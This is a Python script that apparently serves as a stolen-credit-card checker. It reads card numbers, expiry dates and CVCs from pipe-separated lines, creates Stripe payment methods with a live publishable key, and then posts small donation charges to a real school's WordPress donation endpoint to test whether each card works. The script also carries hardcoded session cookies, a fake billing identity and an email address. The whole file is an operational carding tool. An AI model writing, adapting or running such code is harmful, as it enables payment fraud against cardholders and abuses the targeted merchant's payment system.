import requests,re
import random
def Tele(ccx):
        ccx=ccx.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3]
        if "20" in yy:#Mo3gza
                yy = yy.split("20")[1]
        r = requests.session()

        random_amount1 = random.randint(1, 4)
        random_amount2 = random.randint(1, 99)

        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 14; Infinix X6833B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
        }

        data = f'type=card&billing_details[name]=Sakura&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+card-element&key=pk_live_51LTAH3KQqBJAM2n1ywv46dJsjQWht8ckfcm7d15RiE8eIpXWXUvfshCKKsDCyFZG48CY68L9dUTB0UsbDQe32Zn700Qe4vrX0d'

        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

        pm = response.json()['id']

        cookies = {
            '__stripe_mid': '7dd8c7c2-990b-47fb-8b3b-a88f18109158c86af7',
            '__stripe_sid': '3f8ac2ac-6636-4585-b1ce-c095a26f2aba2e8c5c',
        }

        headers = {
            'authority': 'texassouthernacademy.com',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            # 'cookie': '__stripe_mid=7dd8c7c2-990b-47fb-8b3b-a88f18109158c86af7; __stripe_sid=3f8ac2ac-6636-4585-b1ce-c095a26f2aba2e8c5c',
            'origin': 'https://texassouthernacademy.com',
            'referer': 'https://texassouthernacademy.com/donation/',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 14; Infinix X6833B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        data = {
            'action': 'wp_full_stripe_inline_donation_charge',
            'wpfs-form-name': 'donate',
            'wpfs-form-get-parameters': '%7B%7D',
            'wpfs-custom-amount': 'other',
            'wpfs-custom-amount-unique': '0.5',
            'wpfs-donation-frequency': 'one-time',
            'wpfs-billing-name': 'Sakura ',
            'wpfs-billing-address-country': 'US',
            'wpfs-billing-address-line-1': '27 Allen St ',
            'wpfs-billing-address-line-2': '',
            'wpfs-billing-address-city': 'New York ',
            'wpfs-billing-address-state': '',
            'wpfs-billing-address-state-select': 'NY',
            'wpfs-billing-address-zip': '10002',
            'wpfs-card-holder-email': 'loverbagan8@gmail.com',
            'wpfs-card-holder-name': 'Sakura',
            'wpfs-stripe-payment-method-id': f'{pm}',
        }

        response = requests.post('https://texassouthernacademy.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)

        result = response.json()['message']

        return result
